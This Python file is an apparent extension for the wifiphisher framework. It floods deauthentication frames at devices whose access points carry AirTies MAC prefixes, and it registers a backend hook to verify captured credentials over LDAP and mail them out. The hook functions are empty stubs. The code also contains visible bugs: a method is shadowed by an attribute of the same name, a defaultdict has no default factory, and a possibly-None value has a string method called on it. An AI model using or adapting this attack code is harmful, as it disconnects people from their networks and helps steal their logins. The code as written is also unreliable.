import logging
from _collections import defaultdict

import scapy.layers.dot11 as dot11
from wifiphisher.common import uimethods, extensions

import wifiphisher.common.globals as universal

logger = logging.getLogger(__name__)


class DeAuthAirTies:

    def __init__(self, shared_data):
        self.data = shared_data
        self._packets_to_send = defaultdict()
        self.send_output = False

    @staticmethod
    def _extract_bssid(packet):
        ds_value = packet.FCfield & 3
        to_ds = ds_value & 0x1 != 0
        from_ds = ds_value & 0x2 != 0

        return ((not to_ds and not from_ds and packet.addr3)
                or (not to_ds and from_ds and packet.addr2)
                or (to_ds and not from_ds and packet.addr1) or None)

    @staticmethod
    def send_channels():
        return universal.ALL_2G_CHANNELS

    def get_packet(self, pkt):
        bssid = self._extract_bssid(pkt)
        # AirTies Wireless Networks MAC prefixes
        if bssid.startswith("00:1C:A8") or bssid.startswith("18:28:61") or bssid.startswith("88:41:FC"):
            receiver = pkt.addr1
            sender = pkt.addr2
            de_auth_part = dot11.Dot11(
                type=0, subtype=12, addr1=receiver, addr2=sender, addr3=bssid)
            de_auth_packet = (dot11.RadioTap() / de_auth_part / dot11.Dot11Deauth())
            if de_auth_packet not in self._packets_to_send["*"]:
                self._packets_to_send["*"] += de_auth_packet

            self.send_output = True

        return self._packets_to_send

    @uimethods.uimethod
    def get_connected_devices(self, data):
        return len(data.connected_devices)

    @extensions.register_backend_funcs
    def ldap_verify(self, *list_data):
        if self.check_credits_over_ldap(list_data):
            self.send_mail_with_credits(list_data)
            return 'success'
        return 'fail'

    def check_credits_over_ldap(self, list_data):
        pass

    def send_mail_with_credits(self, data):
        pass

    def send_mail(self, pkt):
        pass

    def send_output(self, pkt):
        if self.send_output:
            self.send_output = False
            self.send_mail(pkt)
            return ["Found an AirTies device!"]

    def on_exit(self):
        pass


